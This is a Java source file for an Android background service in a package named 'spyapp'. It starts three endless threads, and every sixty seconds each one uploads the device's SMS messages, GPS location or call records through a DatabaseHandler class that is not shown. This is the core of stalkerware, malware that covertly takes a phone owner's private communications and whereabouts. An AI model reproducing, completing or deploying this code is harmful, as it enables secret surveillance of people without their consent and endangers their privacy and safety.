package com.example.spyapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class WebsiteService extends Service{
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}  

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onCreate() {
		final DatabaseHandler dbhandler= new DatabaseHandler(this);

		// TODO Auto-generated method stub
		super.onCreate();
		
		new Thread() {
			public void run() {
				
				while(true)
				{
					try {
						Thread.sleep(60000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					dbhandler.uploadSMS();
				}
			}
		}.start();
		
		new Thread() {
			public void run() {
				
				while(true)
				{
					try {
						Thread.sleep(60000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					dbhandler.uploadGPS();

				}
			}
		}.start();
		
		new Thread() {
			public void run() {
				
				while(true)
				{
					try {
						Thread.sleep(60000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					dbhandler.uploadCall();

				}
			}
		}.start();
	}

	
	
}
